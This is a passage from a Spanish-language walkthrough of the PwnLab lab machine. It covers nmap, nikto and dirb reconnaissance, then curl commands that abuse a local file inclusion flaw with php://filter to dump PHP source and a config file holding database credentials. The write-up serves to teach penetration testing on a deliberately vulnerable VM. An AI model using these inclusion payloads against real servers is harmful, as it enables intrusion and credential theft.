|   Some Capabilities: Support41Auth, SupportsTransactions, Speaks41ProtocolNew, Speaks41ProtocolOld, FoundRows, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, ConnectWithDatabase, IgnoreSigpipes, LongColumnFlag, IgnoreSpaceBeforeParenthesis, LongPassword, ODBCClient, DontAllowDatabaseTableColumn, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: _H'+BI(-IeD`99QlLv1-
|_  Auth Plugin Name: mysql_native_password
MAC Address: 00:0C:29:4C:1F:7E (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=7/15%OT=80%CT=1%CU=32193%PV=N%DS=1%DC=D%G=Y%M=000C29%T
OS:M=64B2908F%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10D%TI=Z%CI=I%II=I
OS:%TS=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6
OS:=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 0.006 days (since Sat Jul 15 06:18:19 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.74 ms 174.0.0.129
```

Ese es el escaneo de nuestra máquina objetivo, a este paso ya obtuvimos mucha información, además de este escaneo, se realizará otro escaneo con la herramienta **nikto**; esta herramienta se encarga de buscar vulnerabilidades dentro del host establecido:

```
┌──(al3j4ndr0㉿kali)-[~/Escritorio]
└─$ nikto -h http://174.0.0.129                                                        
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          174.0.0.129
+ Target Hostname:    174.0.0.129
+ Target Port:        80
+ Start Time:         2023-07-16 07:56:32 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
+ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /config.php: PHP Config file may contain database IDs and passwords.
+ /images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /login.php: Admin login page/section found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8074 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2023-07-16 07:57:04 (GMT-6) (32 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

+ El encabezado **X-Frame-Options anti-clickjacking** no está presente; si este encabezado no está presente podríamos ser expuestos a ataques de **Clickjacking**.
+ El encabezado **X-Content-Type-Options** no está configurado; cada recurso alojado en un servidor web está asociado con el tipo MIME (también llamado tipo de contenido). Existe la posibilidad de ejecutar hojas de estilo y robar contenido de otro sitio a través del tipo de contenido no coincide. Puede evitar esta vulnerabilidad agregando nosniff en el encabezado
+ /config.php: El archivo de configuración de PHP puede contener ID y contraseñas de bases de datos.
+ /icons/README: archivo predeterminado de Apache encontrado.
+ /#wp-config.php#: Archivo #wp-config.php# encontrado. Este archivo contiene las **credenciales**.

Como podemos ver, ya encontramos varios vectores de ataques (Clickjacking, MIME, config.php, /icons/README), aunque para este ejercicio sólo nos interesan 2 de estos vectores (MIME y config.php) al realizar este escaneo en otros escenarios podríamos tratar de explotar cada una de ellas buscando información valiosa.

A pesar de este escaneo de vulnerabilidades, existe otro escaneo realizado con *nmap* aunque es muy ruidoso, aporta demasiada información:

```
┌──(al3j4ndr0㉿kali)-[~/Escritorio]
└─$ sudo nmap -f -sS -sV -Pn --script all 174.0.0.129
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 16:39 CST
Pre-scan script results:
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| ipv6-multicast-mld-list: 
|   fe80::20c:29ff:fe4c:1f7e: 
|     device: eth0
|     mac: 000c294c1f7e
|     multicast_ips: 
|       ff02::202                 (unknown)
|_      ff02::1:ff4c:1f7e         (NDP Solicited-node)
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     Interface: eth0
|     IP Offered: 174.0.0.130
|     Server Identifier: 174.0.0.254
|     Subnet Mask: 255.255.255.0
|     Router: 174.0.0.2
|     Domain Name Server: 174.0.0.2
|     Domain Name: localdomain
|     Broadcast Address: 174.0.0.255
|_    NetBIOS Name Server: 174.0.0.2
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
|_broadcast-wpad-discover: Failed to retrieve wpad.dat (http://wpad.cg.shawcable.net/wpad.dat) from server
| targets-ipv6-multicast-mld: 
|   IP: fe80::20c:29ff:fe4c:1f7e  MAC: 000c294c1f7e  IFACE: eth0
| 
|_  Use --script-args=newtargets to add the results as targets
| targets-ipv6-multicast-echo: 
|   IP: fe80::20c:29ff:fe4c:1f7e  MAC: 000c294c1f7e  IFACE: eth0
|_  Use --script-args=newtargets to add the results as targets
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_eap-info: please specify an interface with -e
| targets-ipv6-multicast-slaac: 
|   IP: fe80::20c:29ff:fe4c:1f7e  MAC: 000c294c1f7e  IFACE: eth0
|_  Use --script-args=newtargets to add the results as targets
| broadcast-listener: 
|   ether
|       ARP Request
|         sender ip  sender mac    target ip
|         174.0.0.2  005056ea8ae1  174.0.0.130
|   udp
|       DHCP
|         srv ip       cli ip       mask           gw         dns        vendor
|         174.0.0.254  174.0.0.130  255.255.255.0  174.0.0.2  174.0.0.2  -
|       SSDP
|         ip         uri
|_        174.0.0.1   urn:dial-multiscreen-org:service:dial:1
| broadcast-ping: 
|   IP: 174.0.0.2  MAC: 005056ea8ae1
|_  Use --script-args=newtargets to add the results as targets
| targets-ipv6-multicast-invalid-dst: 
|   IP: fe80::20c:29ff:fe4c:1f7e  MAC: 000c294c1f7e  IFACE: eth0
|_  Use --script-args=newtargets to add the results as targets
Nmap scan report for 174.0.0.129
Host is up (0.0040s latency).
Not shown: 997 closed tcp ports (reset)
Bug in http-security-headers: no string output.
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-chrono: Request times for /; avg: 178.82ms; min: 156.64ms; max: 206.06ms
|_http-errors: Couldn't find any error pages.
| http-cookie-flags: 
|   /login.php: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-mobileversion-checker: No mobile version detected.
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1
|     /images/
|       png: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /images/
|   Total files found (by extension):
|_    Other: 1; png: 1
|_http-slowloris: false
|_http-comments-displayer: Couldn't find any comments.
|_http-server-header: Apache/2.4.10 (Debian)
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=174.0.0.129
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://174.0.0.129:80/?page=login
|     Form id: user
|_    Form action: 
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-title: PwnLab Intranet Image Hosting
|_http-fetch: Please enter the complete path of the directory to save data in.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-config-backup: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.10: 
|       PACKETSTORM:171631      7.5     https://vulners.com/packetstorm/PACKETSTORM:171631      *EXPLOIT*
|       EDB-ID:51193    7.5     https://vulners.com/exploitdb/EDB-ID:51193      *EXPLOIT*
|       CVE-2023-25690  7.5     https://vulners.com/cve/CVE-2023-25690
|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
|       5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9    7.5     https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9  *EXPLOIT*
|       1337DAY-ID-38427        7.5     https://vulners.com/zdt/1337DAY-ID-38427        *EXPLOIT*
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2016-5387   6.8     https://vulners.com/cve/CVE-2016-5387
|       CVE-2014-0226   6.8     https://vulners.com/cve/CVE-2014-0226
|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
|       CVE-2022-36760  5.1     https://vulners.com/cve/CVE-2022-36760
|       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
|       SSV:62058       5.0     https://vulners.com/seebug/SSV:62058    *EXPLOIT*
|       EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    5.0     https://vulners.com/exploitpack/EXPLOITPACK:DAED9B9E8D259B28BF72FC7FDC4755A7    *EXPLOIT*
|       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
|       EDB-ID:42745    5.0     https://vulners.com/exploitdb/EDB-ID:42745      *EXPLOIT*
|       EDB-ID:40961    5.0     https://vulners.com/exploitdb/EDB-ID:40961      *EXPLOIT*
|       CVE-2022-37436  5.0     https://vulners.com/cve/CVE-2022-37436
|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1303   5.0     https://vulners.com/cve/CVE-2018-1303
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2016-8743   5.0     https://vulners.com/cve/CVE-2016-8743
|       CVE-2016-2161   5.0     https://vulners.com/cve/CVE-2016-2161
|       CVE-2016-0736   5.0     https://vulners.com/cve/CVE-2016-0736
|       CVE-2015-3183   5.0     https://vulners.com/cve/CVE-2015-3183
|       CVE-2015-0228   5.0     https://vulners.com/cve/CVE-2015-0228
|       CVE-2014-3583   5.0     https://vulners.com/cve/CVE-2014-3583
|       CVE-2014-3581   5.0     https://vulners.com/cve/CVE-2014-3581
|       CVE-2013-5704   5.0     https://vulners.com/cve/CVE-2013-5704
|       CVE-2006-20001  5.0     https://vulners.com/cve/CVE-2006-20001
|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
|       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
|       1337DAY-ID-26574        5.0     https://vulners.com/zdt/1337DAY-ID-26574        *EXPLOIT*
|       CVE-2020-11985  4.3     https://vulners.com/cve/CVE-2020-11985
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-1302   4.3     https://vulners.com/cve/CVE-2018-1302
|       CVE-2018-1301   4.3     https://vulners.com/cve/CVE-2018-1301
|       CVE-2016-4975   4.3     https://vulners.com/cve/CVE-2016-4975
|       CVE-2015-3185   4.3     https://vulners.com/cve/CVE-2015-3185
|       CVE-2014-8109   4.3     https://vulners.com/cve/CVE-2014-8109
|       CVE-2014-0118   4.3     https://vulners.com/cve/CVE-2014-0118
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
|       CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
|       CVE-2016-8612   3.3     https://vulners.com/cve/CVE-2016-8612
|_      PACKETSTORM:140265      0.0     https://vulners.com/packetstorm/PACKETSTORM:140265      *EXPLOIT*
| http-auth-finder: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=174.0.0.129
|   url                                method
|_  http://174.0.0.129:80/?page=login  FORM
| http-enum: 
|   /login.php: Possible admin folder
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|_  /upload/: Potentially interesting directory w/ listing on 'apache/2.4.10 (debian)'
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-date: Sun, 16 Jul 2023 00:53:35 GMT; -22h17m19s from local time.
| http-vhosts: 
|_128 names had status 200
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-brute:   
|_  Path "/" does not require authentication
|_citrix-brute-xml: FAILED: No domain specified (use ntdomain argument)
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
|_http-feed: Couldn't find any feeds.
| http-headers: 
|   Date: Sun, 16 Jul 2023 00:23:26 GMT
|   Server: Apache/2.4.10 (Debian)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-xssed: No previously reported XSS vuln.
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45637/udp   status
|   100024  1          53525/tcp   status
|   100024  1          53879/udp6  status
|_  100024  1          58489/tcp6  status
3306/tcp open  mysql   MySQL (blocked - too many connection errors)
|_mysql-empty-password: Host 's0106606c634e2b63.cg.shawcable.net' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
|_banner: \x80\x00\x00\x00\xFFi\x04Host 's0106606c634e2b63.cg.shawcabl...
| mysql-brute: 
|   Accounts: No valid accounts found
|   Statistics: Performed 0 guesses in 1 seconds, average tps: 0.0
|_  ERROR: The service seems to have failed or is heavily firewalled...
| mysql-enum: 
|   Accounts: No valid accounts found
|   Statistics: Performed 0 guesses in 1 seconds, average tps: 0.0
|_  ERROR: The service seems to have failed or is heavily firewalled...
MAC Address: 00:0C:29:4C:1F:7E (VMware)

Host script results:
| qscan: 
| PORT  FAMILY  MEAN (us)  STDDEV    LOSS (%)
| 1     0       11797.00   17993.44  0.0%
| 80    0       3529.80    7941.11   0.0%
| 111   0       3160.70    6688.91   0.0%
|_3306  0       4409.40    11293.94  0.0%
|_ipidseq: All zeros
|_whois-domain: You should provide a domain name.
|_fcrdns: FAIL (No PTR record)
| dns-blacklist: 
|   SPAM
|     all.spamrats.com - FAIL
|     l2.apews.org - FAIL
|_    bl.nszones.com - DYNAMIC
|_clock-skew: -22h17m19s
| port-states: 
|   tcp: 
|     open: 80,111,3306
|_    closed: 1,3-4,6-7,9,13,...,65129,65389
|_dns-brute: Can't guess domain of "174.0.0.129"; use dns-brute.domain script argument.
|_tor-consensus-checker: 174.0.0.129 not found in Tor consensus
|_path-mtu: PMTU == 1500
|_asn-query: No Answers
| ip-geolocation-geoplugin: coordinates: 51.0207, -114.1011
|_location: Alberta, Canada
| whois-ip: Record found at whois.arin.net
| netrange: 174.0.0.0 - 174.7.255.255
| netname: SHAW-COMM
| orgname: Shaw Communications Inc.
| orgid: SHAWC
|_country: CA stateprov: AB

Post-scan script results:
| reverse-index: 
|   80/tcp: 174.0.0.129
|   111/tcp: 174.0.0.129
|_  3306/tcp: 174.0.0.129
Bug in ip-geolocation-map-google: no string output.
Bug in ip-geolocation-map-bing: no string output.
Bug in ip-geolocation-map-kml: no string output.
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2167.47 seconds
```

Este escaneo muestra toda la información de los puertos, es muy poco recomendado realizar este tipo de escaneo, debido a que los archivos *log* del servidor victima se registrará toda la información y no es nada bueno ese tipo de registros...

A continuación estaré fragmentando el primer escaneo de nuestra máquina objetivo que se realizó con la finalidad de poder detectar más vectores de ataque que podamos descubrir, iniciamos con el puerto **80** y sus servicios cargados:

```
PORT     STATE SERVICE REASON         VERSION
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
|_http-title: PwnLab Intranet Image Hosting
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
```

Si nos conectamos en el navegador a esta dirección obtenemos el siguiente portal, al parecer se trata de un servidor de alojamiento de imágenes, para poder cargar una imagen al servidor, tenemos que loguearnos primero:

```
http://174.0.0.129/
```

<center>
    <img src='./../assets/img/posts/20230702/Session_05.png'>
</center>

```
http://174.0.0.129/?page=login
```

<center>
    <img src='./../assets/img/posts/20230702/Session_06.png'>
</center>

```
http://174.0.0.129/?page=upload
```

<center>
    <img src='./../assets/img/posts/20230702/Session_07.png'>
</center>

Con estos datos trataremos de probar LFI (inclusión de archivos locales) en combinación con PHP a los 3 sitios disponibles (index, upload, login):

```
┌──(al3j4ndr0㉿kali)-[~]
└─$ curl -s http://174.0.0.129?page=php://filter/convert.base64-encode/resource=index | grep -e '[^\ ]\{40,\}' | base64 -d
<?php
//Multilingual. Not implemented yet.
//setcookie("lang","en.lang.php");
if (isset($_COOKIE['lang']))
{
        include("lang/".$_COOKIE['lang']);
}
// Not implemented yet.
?>
<html>
<head>
<title>PwnLab Intranet Image Hosting</title>
</head>
<body>
<center>
<img src="images/pwnlab.png"><br />
[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
<hr/><br/>
<?php
        if (isset($_GET['page']))
        {
                include($_GET['page'].".php");
        }
        else
        {
                echo "Use this server to upload and share image files inside the intranet";
        }
?>
</center>
</body>
</html>base64: entrada inválida
```
```
┌──(al3j4ndr0㉿kali)-[~]
└─$ curl -s http://174.0.0.129?page=php://filter/convert.base64-encode/resource=upload | grep -e '[^\ ]\{40,\}' | base64 -d
<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
        <body>
                <form action='' method='post' enctype='multipart/form-data'>
                        <input type='file' name='file' id='file' />
                        <input type='submit' name='submit' value='Upload'/>
                </form>
        </body>
</html>
<?php 
if(isset($_POST['submit'])) {
        if ($_FILES['file']['error'] <= 0) {
                $filename  = $_FILES['file']['name'];
                $filetype  = $_FILES['file']['type'];
                $uploaddir = 'upload/';
                $file_ext  = strrchr($filename, '.');
                $imageinfo = getimagesize($_FILES['file']['tmp_name']);
                $whitelist = array(".jpg",".jpeg",".gif",".png"); 

                if (!(in_array($file_ext, $whitelist))) {
                        die('Not allowed extension, please upload images only.');
                }

                if(strpos($filetype,'image') === false) {
                        die('Error 001');
                }

                if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
                        die('Error 002');
                }

                if(substr_count($filetype, '/')>1){
                        die('Error 003');
                }

                $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

                if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
                        echo "<img src=\"".$uploadfile."\"><br />";
                } else {
                        die('Error 4');
                }
        }
}

?>base64: entrada inválida
```
```
┌──(al3j4ndr0㉿kali)-[~]
└─$ curl -s http://174.0.0.129?page=php://filter/convert.base64-encode/resource=login | grep -e '[^\ ]\{40,\}' | base64 -d
<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
        $luser = $_POST['user'];
        $lpass = base64_encode($_POST['pass']);

        $stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
        $stmt->bind_param('ss', $luser, $lpass);

        $stmt->execute();
        $stmt->store_Result();

        if ($stmt->num_rows == 1)
        {
                $_SESSION['user'] = $luser;
                header('Location: ?page=upload');
        }
        else
        {
                echo "Login failed.";
        }
}
else
{
        ?>
        <form action="" method="POST">
        <label>Username: </label><input id="user" type="test" name="user"><br />
        <label>Password: </label><input id="pass" type="password" name="pass"><br />
        <input type="submit" name="submit" value="Login">
        </form>
        <?php
}
base64: entrada inválida
```

En la última consulta que realizamos nos percatamos que está ligado **require("config.php");** al código, por lo que vamos a realizar una consulta más a ver que información nos proporciona:

```
┌──(al3j4ndr0㉿kali)-[~]
└─$ curl -s http://174.0.0.129?page=php://filter/convert.base64-encode/resource=config | grep -e '[^\ ]\{40,\}' | base64 -d
<?php
$server   = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>base64: entrada inválida
```

Vaya, nos acaba de proporcionar el usuario y contraseña de una base de datos!!!, lo dejaré por el momento hasta aquí, ya que, en seguida se volverá a utilizar esta información.

Investigando un poco más acerca del servidor que se encuentra cargado en el puerto 80, nos percatamos que es **Apache httpd 2.4.10 ((Debian))**, buscamos las posibles vulnerabilidades y nos encontramos con las siguientes: [Vulnerabilidades de Apache 2.4](https://httpd.apache.org/security/vulnerabilities_24.html).

Un problema más de este puerto es que las solicitudes hacia el servidor es por medio del método *GET* es decir no son seguras, con este método se pueden indexar todas las carpetas alojadas en el servidor.

Para comprobar este concepto utilizaremos la herramienta **dirb**:

<center>
    <img src='./../assets/img/posts/20230702/Session_08.png'>
</center>

```
---- Scanning URL: http://174.0.0.129/ ----
==> DIRECTORY: http://174.0.0.129/images/
==> DIRECTORY: http://174.0.0.129/upload/
+ http://174.0.0.129/server-status (CODE:403|SIZE:299)
```

<center>
    <img src='./../assets/img/posts/20230702/Session_09.png'>
    <img src='./../assets/img/posts/20230702/Session_10.png'>
    <img src='./../assets/img/posts/20230702/Session_11.png'>
</center>

Podríamos buscar más información acerca de las vulnerabilidades que afectan al puerto 80 y su servidor cargado, pero no nos beneficiaría para el objetivo de este ejercicio; ahora vamos a analizar el siguiente puerto `111`:

```
PORT     STATE SERVICE REASON         VERSION
111/tcp  open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          45637/udp   status
|   100024  1          53525/tcp   status
|   100024  1          53879/udp6  status
|_  100024  1          58489/tcp6  status
```

El puerto 111 proporciona información entre sistemas basados en Unix. Este puerto a menudo se analiza, se puede usar para tomar huellas digitales del sistema operativo y para obtener información sobre los servicios disponibles. Puerto utilizado para NFS, NIS o cualquier servicio basado en rpc.

Para la enumeración de este puerto utilizamos el siguiente comando:

```
┌──(al3j4ndr0㉿kali)-[~]
└─$ rpcinfo 174.0.0.129                                                                    
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100024    1    udp       0.0.0.0.178.69         status     106
    100024    1    tcp       0.0.0.0.209.21         status     106
    100024    1    udp6      ::.210.119             status     106
    100024    1    tcp6      ::.228.121             status     106
```

